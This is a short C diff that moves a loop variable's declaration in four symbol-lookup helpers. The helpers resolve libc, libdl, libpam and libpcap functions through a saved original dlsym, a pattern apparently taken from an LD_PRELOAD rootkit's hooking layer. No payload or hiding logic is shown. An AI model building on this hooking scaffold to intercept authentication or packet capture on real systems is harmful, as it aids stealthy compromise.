@@ -2,8 +2,9 @@ void get_libc_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
     void *libc_handle = dlopen(LIBC_PATH, RTLD_LAZY);
+    char *curcall;
     for(int i = 0; i < LIBC_CALLS_SIZE; i++){
-        char *curcall = libc_calls[i];
+        curcall = libc_calls[i];
 
         if(!strncmp(curcall, symbol, strlen(curcall))){
             *funcptr = o_dlsym(libc_handle, symbol);
@@ -16,8 +17,9 @@ void get_libdl_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
     void *libdl_handle = dlopen(LIBDL_PATH, RTLD_LAZY);
+    char *curcall;
     for(int i = 0; i < LIBDL_CALLS_SIZE; i++){
-        char *curcall = libdl_calls[i];
+        curcall = libdl_calls[i];
 
         if(!strncmp(curcall, symbol, strlen(curcall))){
             *funcptr = o_dlsym(libdl_handle, symbol);
@@ -31,8 +33,9 @@ void get_libpam_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
     void *libpam_handle = dlopen(LIBPAM_PATH, RTLD_LAZY);
+    char *curcall;
     for(int i = 0; i < LIBPAM_CALLS_SIZE; i++){
-        char *curcall = libpam_calls[i];
+        curcall = libpam_calls[i];
 
         if(!strncmp(curcall, symbol, strlen(curcall))){
             *funcptr = o_dlsym(libpam_handle, symbol);
@@ -47,8 +50,9 @@ void get_libpcap_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
     void *libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_LAZY);
+    char *curcall;
     for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++){
-        char *curcall = libpcap_calls[i];
+        curcall = libpcap_calls[i];
 
         if(!strncmp(curcall, symbol, strlen(curcall))){
             *funcptr = o_dlsym(libpcap_handle, symbol);
